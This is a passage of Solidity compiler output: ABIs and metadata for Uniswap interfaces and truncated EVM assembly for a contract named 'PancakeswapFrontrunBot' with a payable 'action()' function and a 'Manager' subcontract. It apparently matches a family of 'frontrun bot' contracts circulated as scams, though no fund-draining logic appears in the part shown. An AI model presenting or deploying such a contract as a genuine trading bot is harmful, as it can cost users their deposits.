			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"contracts/interfaces/IUniswapV2Migrator.sol": {
				"IUniswapV2Migrator": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "token",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amountTokenMin",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amountETHMin",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								}
							],
							"name": "migrate",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"migrate(address,uint256,uint256,address,uint256)": "b7df1d25"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETHMin\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"migrate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/interfaces/IUniswapV2Migrator.sol\":\"IUniswapV2Migrator\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/interfaces/IUniswapV2Migrator.sol\":{\"keccak256\":\"0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124\",\"urls\":[\"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da\",\"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"IUniswapV1Exchange": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "ethToTokenSwapInput",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "removeLiquidity",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "tokenToEthSwapInput",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"balanceOf(address)": "70a08231",
							"ethToTokenSwapInput(uint256,uint256)": "f39b5b9b",
							"removeLiquidity(uint256,uint256,uint256,uint256)": "f88bf15a",
							"tokenToEthSwapInput(uint256,uint256,uint256)": "95e3c50b",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ethToTokenSwapInput\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"removeLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tokenToEthSwapInput\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/interfaces/V1/IUniswapV1Exchange.sol\":\"IUniswapV1Exchange\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/interfaces/V1/IUniswapV1Exchange.sol\":{\"keccak256\":\"0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b\",\"urls\":[\"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65\",\"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"IUniswapV1Factory": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "getExchange",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"getExchange(address)": "06f2bf62"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"getExchange\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"contracts/interfaces/V1/IUniswapV1Factory.sol\":\"IUniswapV1Factory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/interfaces/V1/IUniswapV1Factory.sol\":{\"keccak256\":\"0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589\",\"urls\":[\"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6\",\"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"flashloan.sol": {
				"PancakeswapFrontrunBot": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "string",
									"name": "_tokenName",
									"type": "string"
								},
								{
									"internalType": "string",
									"name": "_tokenSymbol",
									"type": "string"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "action",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenName",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tokenSymbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"flashloan.sol\":367:17651  contract PancakeswapFrontrunBot {\r... */\n  mstore(0x40, 0x80)\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x40\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_3\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_3:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_4\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_4:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_5:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_6:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_6)\ntag_8:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_9\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_9:\n  pop\n  0x40\n  mstore\n  0x20\n  add\n  dup1\n  mload\n  mload(0x40)\n  swap4\n  swap3\n  swap2\n  swap1\n  dup5\n    /* \"--CODEGEN--\":19:30   */\n  0x0100000000\n    /* \"--CODEGEN--\":14:17   */\n  dup3\n    /* \"--CODEGEN--\":11:31   */\n  gt\n    /* \"--CODEGEN--\":8:10   */\n  iszero\n  tag_10\n  jumpi\n    /* \"--CODEGEN--\":44:45   */\n  0x00\n    /* \"--CODEGEN--\":41:42   */\n  dup1\n    /* \"--CODEGEN--\":34:46   */\n  revert\n    /* \"--CODEGEN--\":8:10   */\ntag_10:\n    /* \"--CODEGEN--\":71:82   */\n  dup4\n    /* \"--CODEGEN--\":66:69   */\n  dup3\n    /* \"--CODEGEN--\":62:83   */\n  add\n    /* \"--CODEGEN--\":55:83   */\n  swap2\n  pop\n    /* \"--CODEGEN--\":123:127   */\n  0x20\n    /* \"--CODEGEN--\":118:121   */\n  dup3\n    /* \"--CODEGEN--\":114:128   */\n  add\n    /* \"--CODEGEN--\":159:168   */\n  dup6\n    /* \"--CODEGEN--\":141:157   */\n  dup2\n    /* \"--CODEGEN--\":138:169   */\n  gt\n    /* \"--CODEGEN--\":135:137   */\n  iszero\n  tag_11\n  jumpi\n    /* \"--CODEGEN--\":182:183   */\n  0x00\n    /* \"--CODEGEN--\":179:180   */\n  dup1\n    /* \"--CODEGEN--\":172:184   */\n  revert\n    /* \"--CODEGEN--\":135:137   */\ntag_11:\n    /* \"--CODEGEN--\":219:222   */\n  dup3\n    /* \"--CODEGEN--\":213:223   */\n  mload\n    /* \"--CODEGEN--\":330:339   */\n  dup7\n    /* \"--CODEGEN--\":325:326   */\n  0x01\n    /* \"--CODEGEN--\":311:323   */\n  dup3\n    /* \"--CODEGEN--\":307:327   */\n  mul\n    /* \"--CODEGEN--\":289:305   */\n  dup4\n    /* \"--CODEGEN--\":285:328   */\n  add\n    /* \"--CODEGEN--\":282:340   */\n  gt\n    /* \"--CODEGEN--\":261:272   */\n  0x0100000000\n    /* \"--CODEGEN--\":247:259   */\n  dup3\n    /* \"--CODEGEN--\":244:273   */\n  gt\n    /* \"--CODEGEN--\":233:348   */\n  or\n    /* \"--CODEGEN--\":230:232   */\n  iszero\n  tag_12\n  jumpi\n    /* \"--CODEGEN--\":361:362   */\n  0x00\n    /* \"--CODEGEN--\":358:359   */\n  dup1\n    /* \"--CODEGEN--\":351:363   */\n  revert\n    /* \"--CODEGEN--\":230:232   */\ntag_12:\n    /* \"--CODEGEN--\":384:396   */\n  dup1\n    /* \"--CODEGEN--\":379:382   */\n  dup4\n    /* \"--CODEGEN--\":372:397   */\n  mstore\n    /* \"--CODEGEN--\":420:424   */\n  0x20\n    /* \"--CODEGEN--\":415:418   */\n  dup4\n    /* \"--CODEGEN--\":411:425   */\n  add\n    /* \"--CODEGEN--\":404:425   */\n  swap3\n  pop\n    /* \"--CODEGEN--\":0:432   */\n  pop\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  dup1\n  dup4\n  dup4\n    /* \"--CODEGEN--\":23:24   */\n  0x00\n    /* \"--CODEGEN--\":8:108   */\ntag_13:\n    /* \"--CODEGEN--\":33:36   */\n  dup4\n    /* \"--CODEGEN--\":30:31   */\n  dup2\n    /* \"--CODEGEN--\":27:37   */\n  lt\n    /* \"--CODEGEN--\":8:108   */\n  iszero\n  tag_15\n  jumpi\n    /* \"--CODEGEN--\":99:100   */\n  dup1\n    /* \"--CODEGEN--\":94:97   */\n  dup3\n    /* \"--CODEGEN--\":90:101   */\n  add\n    /* \"--CODEGEN--\":84:102   */\n  mload\n    /* \"--CODEGEN--\":80:81   */\n  dup2\n    /* \"--CODEGEN--\":75:78   */\n  dup5\n    /* \"--CODEGEN--\":71:82   */\n  add\n    /* \"--CODEGEN--\":64:103   */\n  mstore\n    /* \"--CODEGEN--\":52:54   */\n  0x20\n    /* \"--CODEGEN--\":49:50   */\n  dup2\n    /* \"--CODEGEN--\":45:55   */\n  add\n    /* \"--CODEGEN--\":40:55   */\n  swap1\n  pop\n    /* \"--CODEGEN--\":8:108   */\n  jump(tag_13)\ntag_15:\n    /* \"--CODEGEN--\":12:26   */\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n  pop\n  swap1\n  pop\n  swap1\n  dup2\n  add\n  swap1\n  0x1f\n  and\n  dup1\n  iszero\n  tag_16\n  jumpi\n  dup1\n  dup3\n  sub\n  dup1\n  mload\n  0x01\n  dup4\n  0x20\n  sub\n  0x0100\n  exp\n  sub\n  not\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\ntag_16:\n  pop\n  0x40\n  mstore\n  pop\n  pop\n  pop\n    /* \"flashloan.sol\":615:625  _tokenName */\n  dup2\n    /* \"flashloan.sol\":603:612  tokenName */\n  0x00\n    /* \"flashloan.sol\":603:625  tokenName = _tokenName */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_19\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_19:\n  pop\n    /* \"flashloan.sol\":650:662  _tokenSymbol */\n  dup1\n    /* \"flashloan.sol\":636:647  tokenSymbol */\n  0x01\n    /* \"flashloan.sol\":636:662  tokenSymbol = _tokenSymbol */\n  swap1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  tag_21\n  swap3\n  swap2\n  swap1\n  tag_20\n  jump\t// in\ntag_21:\n  pop\n    /* \"flashloan.sol\":683:696  new Manager() */\n  mload(0x40)\n  tag_22\n  swap1\n  tag_23\n  jump\t// in\ntag_22:\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  0x00\n  create\n  dup1\n  iszero\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_24\n  jumpi\n    /* \"--CODEGEN--\":45:61   */\n  returndatasize\n    /* \"--CODEGEN--\":42:43   */\n  0x00\n    /* \"--CODEGEN--\":39:40   */\n  dup1\n    /* \"--CODEGEN--\":24:62   */\n  returndatacopy\n    /* \"--CODEGEN--\":77:93   */\n  returndatasize\n    /* \"--CODEGEN--\":74:75   */\n  0x00\n    /* \"--CODEGEN--\":67:94   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_24:\n    /* \"flashloan.sol\":683:696  new Manager() */\n  pop\n    /* \"flashloan.sol\":673:680  manager */\n  0x03\n  0x00\n    /* \"flashloan.sol\":673:696  manager = new Manager() */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"flashloan.sol\":519:704  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r... */\n  pop\n  pop\n    /* \"flashloan.sol\":367:17651  contract PancakeswapFrontrunBot {\r... */\n  jump(tag_25)\ntag_20:\n  dup3\n  dup1\n  sload\n  0x01\n  dup2\n  0x01\n  and\n  iszero\n  0x0100\n  mul\n  sub\n  and\n  0x02\n  swap1\n  div\n  swap1\n  0x00\n  mstore\n  keccak256(0x00, 0x20)\n  swap1\n  0x1f\n  add\n  0x20\n  swap1\n  div\n  dup2\n  add\n  swap3\n  dup3\n  0x1f\n  lt\n  tag_27\n  jumpi\n  dup1\n  mload\n  not(0xff)\n  and\n  dup4\n  dup1\n  add\n  or\n  dup6\n  sstore\n  jump(tag_26)\ntag_27:\n  dup3\n  dup1\n  add\n  0x01\n  add\n  dup6\n  sstore\n  dup3\n  iszero\n  tag_26\n  jumpi\n  swap2\n  dup3\n  add\ntag_28:\n  dup3\n  dup2\n  gt\n  iszero\n  tag_29\n  jumpi\n  dup3\n  mload\n  dup3\n  sstore\n  swap2\n  0x20\n  add\n  swap2\n  swap1\n  0x01\n  add\n  swap1\n  jump(tag_28)\ntag_29:\ntag_26:\n  pop\n  swap1\n  pop\n  tag_30\n  swap2\n  swap1\n  tag_31\n  jump\t// in\ntag_30:\n  pop\n  swap1\n  jump\t// out\ntag_23:\n  dataSize(sub_1)\n  dup1\n  dataOffset(sub_1)\n  dup4\n  codecopy\n  add\n  swap1\n  jump\t// out\ntag_31:\n  tag_32\n  swap2\n  swap1\ntag_33:\n  dup1\n  dup3\n  gt\n  iszero\n  tag_34\n  jumpi\n  0x00\n  dup2\n  0x00\n  swap1\n  sstore\n  pop\n  0x01\n  add\n  jump(tag_33)\ntag_34:\n  pop\n  swap1\n  jump\ntag_32:\n  swap1\n  jump\t// out\ntag_25:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"flashloan.sol\":367:17651  contract PancakeswapFrontrunBot {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0a7a1c4d\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x6c02a931\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x7b61c320\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"flashloan.sol\":15951:16076  function action() public payable { \r... */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"flashloan.sol\":409:432  string public tokenName */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_10:\n        /* \"flashloan.sol\":409:432  string public tokenName */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_13:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_13)\n    tag_15:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"flashloan.sol\":409:432  string public tokenName */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n  